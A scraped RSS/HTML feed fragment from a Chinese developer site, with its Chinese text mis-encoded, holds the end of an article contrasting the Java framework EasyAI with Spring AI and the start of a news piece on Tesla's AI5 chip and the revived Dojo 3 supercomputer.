<li><strong>å¿«é€ŸåŸå‹éªŒè¯</strong>ï¼šå¿«é€ŸéªŒè¯ AI èƒ½ä¸èƒ½è§£å†³ä¸šåŠ¡é—®é¢˜</li>
<li><strong>å­¦ä¹  AI åŸç†</strong>ï¼šç”¨ç†Ÿæ‚‰çš„è¯­è¨€ç†è§£åº•å±‚ç®—æ³•</li>
</ul>
<p><strong>ä»€ä¹ˆåœºæ™¯ä¸å¤ªé€‚åˆï¼Ÿ</strong></p>
<ul>
<li><strong>éœ€è¦ GPT/BERT è¿™ç±»å¤§æ¨¡å‹</strong>ï¼šEasyAI çš„å®šä½æ˜¯"å°å¾®æ¨¡å‹"</li>
<li><strong>è¿½æ±‚ SOTAï¼ˆæœ€å…ˆè¿›ï¼‰æ•ˆæœ</strong>ï¼šä¸»æµç ”ç©¶æˆæœåŸºæœ¬éƒ½åœ¨ Python ç”Ÿæ€</li>
<li><strong>éœ€è¦ GPU åŠ é€Ÿè®­ç»ƒå¤§è§„æ¨¡æ•°æ®</strong>ï¼šEasyAI çš„ GPU æ”¯æŒæœ‰é™</li>
</ul>
<h2 data-id="heading-9">EasyAI vs Spring AI</h2>
<p>å¾ˆå¤š Java åŒå­¦ä¼šé¡ºå¸¦é—®ä¸€å¥ï¼š<strong>EasyAI è·Ÿ Spring AI æ˜¯ä¸æ˜¯ç«äº‰å…³ç³»ï¼Ÿ</strong>
ç»“è®ºæ˜¯ï¼š<strong>æ›´å¤šæ˜¯äº’è¡¥ï¼Œè€Œä¸æ˜¯æ›¿ä»£</strong>ã€‚å®ƒä»¬è§£å†³çš„é—®é¢˜ä¸ä¸€æ ·ï¼š</p>
<ul>
<li><strong>EasyAI</strong>ï¼šæ›´åƒâ€œJava ç‰ˆçš„å°å¾®æ¨¡å‹/ç®—æ³•æ¡†æ¶â€ï¼ˆå<strong>è®­ç»ƒã€æ¨ç†ã€ç®—æ³•å®ç°</strong>ï¼‰ï¼Œå¼ºè°ƒ <em>çº¯ Javaã€é›¶ä¾èµ–ã€å¼€ç®±å³ç”¨</em>ï¼Œå¹¶æä¾›å›¾åƒè¯†åˆ«ã€è¯­ä¹‰å¤„ç†ã€æ™ºèƒ½å®¢æœç­‰æ¨¡å—ï¼Œä»¥åŠçŸ©é˜µè¿ç®—ã€æ·±åº¦å­¦ä¹ ã€æœºå™¨å­¦ä¹ ç­‰åº•å±‚èƒ½åŠ›ã€‚</li>
<li><strong>Spring AI</strong>ï¼šæ›´åƒâ€œé¢å‘å¤§æ¨¡å‹åº”ç”¨çš„ Spring ç”Ÿæ€é›†æˆå±‚â€ï¼ˆå<strong>è°ƒç”¨ä¸ç¼–æ’</strong>ï¼‰ï¼Œé‡ç‚¹æ˜¯æŠŠ LLMã€Embeddingã€å‘é‡åº“ã€RAGã€å·¥å…·è°ƒç”¨ç­‰èƒ½åŠ›ï¼Œç”¨ Spring çš„æ–¹å¼æ¥å…¥ä½ çš„ä¸šåŠ¡ç³»ç»Ÿã€‚</li>
</ul>
<p>ä½ å¯ä»¥æŠŠå®ƒä»¬ç†è§£æˆä¸¤æ¡è·¯çº¿ï¼š</p>
<ul>
<li><strong>è·¯çº¿ Aï¼šåœ¨ Java é‡Œåš/ç”¨å°å¾®æ¨¡å‹ï¼ˆæœ¬åœ°ç®—æ³•ï¼‰</strong> â†’ EasyAI</li>
<li><strong>è·¯çº¿ Bï¼šåœ¨ Java é‡Œåšå¤§æ¨¡å‹åº”ç”¨ï¼ˆè°ƒç”¨å¤–éƒ¨/æœ¬åœ°å¤§æ¨¡å‹æœåŠ¡ï¼‰</strong> â†’ Spring AI</li>
</ul>








































<table><thead><tr><th>ç»´åº¦</th><th>EasyAI</th><th>Spring AI</th></tr></thead><tbody><tr><td>æ ¸å¿ƒå®šä½</td><td><strong>çº¯ Java AI ç®—æ³•æ¡†æ¶</strong>ï¼ˆåç®—æ³•/æ¨¡å‹èƒ½åŠ›ï¼‰</td><td><strong>å¤§æ¨¡å‹åº”ç”¨æ¡†æ¶</strong>ï¼ˆåé›†æˆ/ç¼–æ’ï¼‰</td></tr><tr><td>ä¸»è¦é¢å‘</td><td>å°å¾®æ¨¡å‹ã€ä¼ ç»Ÿ CV/NLPã€è½»é‡æ™ºèƒ½å®¢æœã€ç®—æ³•å­¦ä¹ ä¸è½åœ°</td><td>LLM åº”ç”¨ã€RAG çŸ¥è¯†åº“ã€Agent/å·¥å…·è°ƒç”¨ã€æç¤ºè¯ä¸æµç¨‹ç¼–æ’</td></tr><tr><td>è¿è¡Œæ–¹å¼</td><td>ä»£ç å†…ç›´æ¥è¿è¡Œï¼ˆå¼ºè°ƒé›¶ä¾èµ–ã€å¯åµŒå…¥ Java é¡¹ç›®ï¼‰</td><td>é€šå¸¸å¯¹æ¥æ¨¡å‹æœåŠ¡/å‘é‡åº“ç­‰ç»„ä»¶ï¼ˆå¼ºè°ƒç”Ÿæ€é€‚é…ä¸å·¥ç¨‹é›†æˆï¼‰</td></tr><tr><td>ä¾èµ–ç”Ÿæ€</td><td>è‡ªå·±æä¾›ç®—æ³•ä¸æ¨¡å—ï¼ˆâ€œæ¡†æ¶å³èƒ½åŠ›â€ï¼‰</td><td>ä¾èµ–å¤–éƒ¨æ¨¡å‹/å‘é‡åº“/æ¨ç†æœåŠ¡ï¼ˆâ€œæ¡†æ¶ç®¡è¿æ¥ä¸æµç¨‹â€ï¼‰</td></tr><tr><td>ä½ æœ€å…³å¿ƒçš„ä»·å€¼</td><td><strong>ä¸ç”¨ Pythonã€æ— éœ€é¢å¤–ç¯å¢ƒ</strong>ä¹Ÿèƒ½åš AI èƒ½åŠ›</td><td><strong>ç”¨ Spring çš„æ–¹å¼</strong>å¿«é€Ÿåš LLM/RAG åº”ç”¨ï¼Œå·¥ç¨‹æ•ˆç‡é«˜</td></tr><tr><td>æ›´é€‚åˆ</td><td>æœ¬åœ°/è¾¹ç¼˜åœºæ™¯ã€èµ„æºå—é™ã€æ˜ç¡®ä»»åŠ¡ã€å°æ¨¡å‹ã€æ•™å­¦å®è·µ</td><td>ä¼ä¸šçŸ¥è¯†åº“é—®ç­”ã€æ–‡æ¡£æ£€ç´¢å¢å¼ºã€å¯¹è¯åŠ©æ‰‹ã€å·¥å…·è°ƒç”¨å·¥ä½œæµ</td></tr></tbody></table>
<p><strong>æ€ä¹ˆé€‰ï¼ˆæˆ–è€…æ€ä¹ˆä¸€èµ·ç”¨ï¼‰ï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœä½ æƒ³è¦çš„æ˜¯ï¼š<strong>â€œä¸å¼•å…¥ Pythonã€ä¸æŠ˜è…¾ç¯å¢ƒï¼Œç›´æ¥åœ¨ Java é‡Œè·‘å‡ºè¯†åˆ«/åˆ†ç±»/å…³é”®è¯æŠ“å–ç­‰èƒ½åŠ›â€</strong> â†’ æ›´å <strong>EasyAI</strong> çš„ä¼˜åŠ¿ã€‚</li>
<li>å¦‚æœä½ æƒ³è¦çš„æ˜¯ï¼š<strong>â€œæŠŠå¤§æ¨¡å‹æ¥è¿›ä¸šåŠ¡ç³»ç»Ÿï¼Œåš RAGã€å¯¹è¯ã€Agentï¼Œè®©æ¨¡å‹èƒ½æŸ¥åº“/è°ƒæ¥å£/è¯»æ–‡æ¡£â€</strong> â†’ æ›´å <strong>Spring AI</strong> çš„ä¼˜åŠ¿ã€‚</li>
<li>å¦‚æœä½ ä¸¤è€…éƒ½è¦ï¼šä¹Ÿå®Œå…¨å¯ä»¥ç»„åˆâ€”â€”
ç”¨ <strong>Spring AI</strong> åšä¸Šå±‚å¯¹è¯ç¼–æ’ä¸ RAGï¼Œç”¨ <strong>EasyAI</strong> åšæŸäº›æœ¬åœ°ç®—æ³•èƒ½åŠ›ï¼ˆä¾‹å¦‚ç‰¹å®šçš„ CV/NLP ç»„ä»¶ï¼‰ä½œä¸ºä¸šåŠ¡é“¾è·¯çš„ä¸€ç¯ã€‚</li>
</ul>
<h2 data-id="heading-10">ä½œè€…çš„è¯</h2>
<p>é¡¹ç›® README é‡Œæœ‰ä¸€æ®µå¾ˆçœŸå®çš„è¯ï¼š</p>
<blockquote>
<p>"æˆ‘çˆ¸è·Ÿæˆ‘è¯´ï¼Œæˆ‘å†™è¿™äº›ä¸œè¥¿è¿˜ä¸å¦‚ç»™æˆ‘æ‰¾ä¸ªé¤é¦†ï¼Œè®©æˆ‘å»ç«¯ç›˜å­ï¼Œæˆ–è€…ç»™æˆ‘æ‰¾ä¸ªè¶…å¸‚å»å¹²æ”¶é“¶ã€‚æ‰€ä»¥å¤§å®¶å¸®å¸®æˆ‘ï¼Œç‚¹å‡»å³ä¸Šè§’ Star æ”¯æŒä¸€ä¸‹ï¼Œæˆ‘è¦è¯æ˜ä»–é”™äº†ï¼Œè°¢è°¢å¸®åŠ©ï¼"</p>
</blockquote>
<p>è¿™ç§çœŸè¯šå’ŒåšæŒï¼Œæ­£æ˜¯å’±ä»¬æŠ€æœ¯äººæœ€åŠ¨äººçš„åœ°æ–¹ã€‚ç›®å‰ EasyAI å·²ç»æ”¯æŒå…è´¹å•†ç”¨ ã€‚<strong>æ²¡æœ‰é“¶å¼¹ï¼Œè¡ŒåŠ¨èµ·æ¥æ‰æ˜¯æ‰“ç ´ç„¦è™‘çš„å”¯ä¸€åŠæ³•ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI5èŠ¯ç‰‡æå®šï¼Œé©¬æ–¯å…‹çš„çº¯è‡ªç ”è¶…ç®—Dojo 3åˆå›æ¥äº†]]></title>    <link>https://juejin.cn/post/7597650624636911616</link>    <guid>https://juejin.cn/post/7597650624636911616</guid>    <pubDate>2026-01-21T11:05:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597650624636911616" data-draft-id="7597452210646597632" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI5èŠ¯ç‰‡æå®šï¼Œé©¬æ–¯å…‹çš„çº¯è‡ªç ”è¶…ç®—Dojo 3åˆå›æ¥äº†"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2026-01-21T11:05:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœºå™¨ä¹‹å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI5èŠ¯ç‰‡æå®šï¼Œé©¬æ–¯å…‹çš„çº¯è‡ªç ”è¶…ç®—Dojo 3åˆå›æ¥äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœºå™¨ä¹‹å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:05:51.000Z" title="Wed Jan 21 2026 11:05:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é©¬æ–¯å…‹ä¸¢äº†ä¸ªé‡ç£…ç‚¸å¼¹ï¼š</p>
<p>ã€ŒAI5 èŠ¯ç‰‡è®¾è®¡è¿›å±•é¡ºåˆ©ï¼Œç‰¹æ–¯æ‹‰å°†é‡å¯ Dojo3 çš„å·¥ä½œã€‚ã€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/948c1bfbfc0244bab2d2a0d5a2480fac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=yNWNYO9l0Yfw7vlp92VuJRSxt3c%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç®€å•ä¸¤å¥è¯ï¼ŒåŒ…å«äº†ç‰¹åˆ«å¤§çš„ä¿¡æ¯é‡ã€‚</p>
<p>Dojo é¡¹ç›®æ˜¯åœ¨ 2021 å¹´ç‰¹æ–¯æ‹‰ AI Day é¦–æ¬¡æå‡ºï¼Œå®šä½æ˜¯ã€Œé¢å‘æœºå™¨å­¦ä¹ è®­ç»ƒçš„è¶…çº§è®¡ç®—æœºã€ï¼Œç›®çš„æ˜¯å¤„ç†æ¥è‡ªç‰¹æ–¯æ‹‰æ±½è½¦çš„è§†é¢‘å½•åˆ¶å’Œå…¶ä»–æ•°æ®ï¼Œå¹¶åˆ©ç”¨è¿™äº›æ•°æ®æ¥è®­ç»ƒå…¬å¸å…¨è‡ªåŠ¨é©¾é©¶è½¯ä»¶èƒŒåçš„ã€Œç¥ç»ç½‘ç»œã€ã€‚</p>
<p>åœ¨ 2021 å¹´çš„ CVPR å¤§ä¼šä¸Šï¼Œæ—¶ä»»ç‰¹æ–¯æ‹‰äººå·¥æ™ºèƒ½é«˜çº§æ€»ç›‘çš„ Andrej Karpathy æ›¾è¡¨ç¤ºï¼Œä»…å‡­è§†è§‰æŠ€æœ¯ï¼Œè®¡ç®—æœºå¿…é¡»ä»¥ä¸äººç±»ç›¸åŒçš„é€Ÿåº¦å’Œæ•é”åº¦å¯¹æ–°ç¯å¢ƒåšå‡ºååº”ã€‚ç„¶è€Œï¼Œè¿™éœ€è¦åˆ©ç”¨å¼ºå¤§çš„è¶…çº§è®¡ç®—æœºï¼ŒåŸºäºæµ·é‡æ•°æ®é›†å¯¹äººå·¥æ™ºèƒ½è¿›è¡Œè®­ç»ƒã€‚è€Œç‰¹æ–¯æ‹‰å°±æ‹¥æœ‰è¿™æ ·ä¸€å°è¶…çº§è®¡ç®—æœºï¼Œå³ Dojoã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f61f1f10f0f749e8bfa1951ed71335f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=682NtzBG%2BdFkIWbZ5n99c%2FKCspU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>2023 å¹´ 7 æœˆï¼ŒDojo æ­£å¼æŠ•äº§ã€‚å½¼æ—¶ï¼Œé©¬æ–¯å…‹å¯¹ Dojo é¡¹ç›®å……æ»¡äº†æœŸå¾…ã€‚</p>
<p>ä½†ä¸çŸ¥å¤§å®¶è¿˜è®°ä¸è®°å¾—ï¼Œå»å¹´ 8 æœˆï¼Œé©¬æ–¯å…‹çªç„¶ã€Œå…¨é¢å«åœã€Dojo é¡¹ç›®ï¼Œæš‚æ—¶è§£æ•£ä¸“é—¨çš„ Dojo å›¢é˜Ÿï¼Œé¡¹ç›®è´Ÿè´£äºº Peter Bannon ç¦»èŒï¼Œçº¦ 20 åæ ¸å¿ƒæˆå‘˜ä¹Ÿè·³æ§½æˆç«‹æ–°å…¬å¸ DensityAIã€‚</p>
<p>å½“æ—¶ï¼Œç‰¹æ–¯æ‹‰å®é™…ä¸Šåœ¨åŒæ—¶æ¨è¿›ä¸¤å¥—å®Œå…¨ä¸åŒçš„èŠ¯ç‰‡ä½“ç³»ï¼šç”¨äºè½¦è½½ç³»ç»Ÿå’Œæœºå™¨äººçš„èŠ¯ç‰‡ï¼Œä»¥åŠç”¨äºå¤§è§„æ¨¡ AI è®­ç»ƒçš„èŠ¯ç‰‡ã€‚</p>
<p>äº‹å®è¯æ˜ï¼Œè¿™æ ·çš„åŒçº¿æ¨è¿›æ•ˆç‡å¹¶ä¸é«˜ã€‚é©¬æ–¯å…‹å¿…é¡»åšäº›å–èˆï¼Œäºæ˜¯å†³å®šæš‚åœ Dojo é¡¹ç›®å·¥ä½œï¼Œæ¥å°†å…¨éƒ¨èµ„æºæŠ•å…¥åˆ°æœ€å…·æˆ˜ç•¥æ„ä¹‰çš„ AI5 èŠ¯ç‰‡ä¸Šã€‚Â </p>
<p>å½¼æ—¶ï¼Œå¤–ç•Œå¬åˆ°è¿™ä¸€æ¶ˆæ¯ï¼Œå¾ˆå¤šäººéƒ½è®¤ä¸º Dojo é¡¹ç›®æ˜¯ä¸€æ¬¡å¤±è´¥ï¼Œç”šè‡³è®¤ä¸ºé©¬æ–¯å…‹å·²ç»æ”¾å¼ƒäº†è¯¥é¡¹ç›®ã€‚ä½†ç°åœ¨çœ‹æ¥äº‹å®å¹¶éå¦‚æ­¤ã€‚</p>
<p>å½“æ—¶é©¬æ–¯å…‹åœ¨ X ä¸Šå‘æ–‡è§£é‡Šï¼šã€Œå¯¹äºç‰¹æ–¯æ‹‰æ¥è¯´ï¼Œåˆ†æ•£èµ„æºå¹¶æ‰©å±•ä¸¤ç§æˆªç„¶ä¸åŒçš„ AI èŠ¯ç‰‡è®¾è®¡æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ç‰¹æ–¯æ‹‰çš„ AI5ã€AI6 åŠåç»­èŠ¯ç‰‡åœ¨æ¨ç†æ–¹é¢å°†éå¸¸å‡ºè‰²ï¼Œè‡³å°‘åœ¨è®­ç»ƒæ–¹é¢ä¹Ÿä¼šç›¸å½“ä¸é”™ã€‚æ‰€æœ‰åŠªåŠ›éƒ½é›†ä¸­åœ¨è¿™ä¸€ç‚¹ä¸Šã€‚ã€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da0c53ea2659486e85d26105144e4ce5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=qqQl6a0T9sl74FhCH1mrHhcHOqc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>AI5 æ˜¯ä¸€é¢—é«˜åº¦å…³é”®çš„èŠ¯ç‰‡ï¼ŒFSDã€Cybercabã€Optimus ç­‰æ ¸å¿ƒé¡¹ç›®éƒ½è¦ä¾èµ–å®ƒã€‚åœ¨ 2025 å¹´ä¸‹åŠå¹´ï¼Œé©¬æ–¯å…‹éå¸¸æ˜ç¡®åœ°è¡¨ç¤ºï¼šAI5 è¿˜è¿œæœªè¾¾åˆ°é¢„æœŸã€‚å¦‚æœ AI5 å¤±è´¥ï¼Œç‰¹æ–¯æ‹‰æœªæ¥çš„è‡ªåŠ¨é©¾é©¶å’Œè‡ªä¸»ç³»ç»Ÿï¼Œå¾ˆå¯èƒ½éƒ½ä¼šå—åˆ°ã€Œè‡´å‘½å½±å“ã€ã€‚</p>
<p>é©¬æ–¯å…‹å¾ˆå¦è¯šåœ°è¯´è¿‡ï¼šã€Œè§£å†³ AI5 å¯¹ç‰¹æ–¯æ‹‰æ¥è¯´æ˜¯ç”Ÿæ­»æ”¸å…³çš„ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘å¿…é¡»å°†ä¸¤ä¸ªå›¢é˜Ÿéƒ½é›†ä¸­åœ¨è¿™ä¸ªèŠ¯ç‰‡ä¸Šï¼Œå¹¶ä¸”æˆ‘ä¸ªäººåœ¨å‡ ä¸ªæœˆçš„æ—¶é—´é‡Œæ¯ä¸ªå‘¨å…­éƒ½æŠ•å…¥å·¥ä½œã€‚ã€</p>
<p>ç‰¹æ–¯æ‹‰å»å¹´åœ¨ X ä¸Šè¡¨ç¤ºï¼ŒAI5 èŠ¯ç‰‡å¯èƒ½æ¯” AI4 èŠ¯ç‰‡æœ‰é«˜å‡º 50 å€çš„æå‡ï¼Œç›®æ ‡åœ¨ 2027 å¹´æŠ•å…¥ç”Ÿäº§ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/088f8255e217471f9414981b08f2d91b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=W64ZY7vQMz%2F29m1UoHh0aGlcjqA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e646391c8944002bd2112285defd656~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=wyvCqZebLCTqrGaiGEMtj5SFo%2B4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å…¶å®å¦‚æœä»”ç»†å›æƒ³ï¼Œå»å¹´é©¬æ–¯å…‹åœ¨å…¬å¼€è§£é‡Š Dojo é¡¹ç›®è¢«ã€Œå«åœã€çš„åŸå› åï¼Œè¿˜è°ˆåˆ°ï¼šã€Œåœ¨ä¸€å¥—è¶…çº§è®¡ç®—æœºé›†ç¾¤ä¸­ï¼Œæ— è®ºæ˜¯ç”¨äºæ¨ç†è¿˜æ˜¯è®­ç»ƒï¼ŒæŠŠå¤§é‡ AI5 / AI6 èŠ¯ç‰‡é›†æˆåˆ°åŒä¸€å—æ¿å¡ä¸Šéƒ½æ˜¯å¾ˆåˆç†çš„åšæ³• â€”â€” è¿™æ ·å¯ä»¥å°†ç½‘ç»œå¸ƒçº¿çš„å¤æ‚åº¦å’Œæˆæœ¬ç›´æ¥é™ä½å¥½å‡ ä¸ªæ•°é‡çº§ã€‚æŸç§æ„ä¹‰ä¸Šï¼Œè¿™å¤§æ¦‚å°±å¯ä»¥è¢«ç§°ä½œ Dojo 3 äº†ã€‚ã€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86783212d5ad4f0b96a2c68d9023c47a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=ywEtTo%2F2mogN14N%2FPdUWDEGRd8I%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è€Œå¦‚ä»Šï¼Œã€ŒDojo3ã€é¡¹ç›®æ„åœ¨å°† 512 é¢— AI5 æˆ– AI6 èŠ¯ç‰‡å¯†é›†é›†æˆäºå•å—ä¸»æ¿ï¼Œå½¢æˆè¶…çº§è®¡ç®—æœºé›†ç¾¤ã€‚åŸæ¥ï¼Œå½“æ—¶é©¬æ–¯å…‹æ—©å·²æš—ç¤ºäº†è¿™ä¸€ç‚¹ï¼Œç”±æ­¤çœ‹æ¥ï¼ŒDojo é¡¹ç›®ä»æ¥å°±æ²¡æœ‰çœŸæ­£åœæ­¢ï¼Œåªä¸è¿‡æ˜¯å…¬å¸æ•´ä½“åœ¨è·¯çº¿ä¼˜å…ˆæƒä¸Šçš„è®©æ­¥è¡Œä¸ºã€‚ç°åœ¨ï¼Œä¸€åˆ‡è¿›å±•éƒ½åœ¨è®¡åˆ’ä¸­ï¼Œæ‰€ä»¥ï¼Œã€ŒDojo3ã€åˆå›æ¥äº†ã€‚</p>
<p>é©¬æ–¯å…‹è¡¨ç¤ºï¼Œã€Œè¿›å±•é¡ºåˆ©ã€çš„ AI5 èŠ¯ç‰‡çš„å•é¢— SoC å¤§è‡´ç›¸å½“äº Hopper çº§åˆ«ï¼ŒåŒé¢—åˆ™ç›¸å½“äº Blackwell çº§åˆ«ï¼Œä½†æˆæœ¬æä½ï¼ŒåŠŸè€—æ›´ä½ã€‚</p>
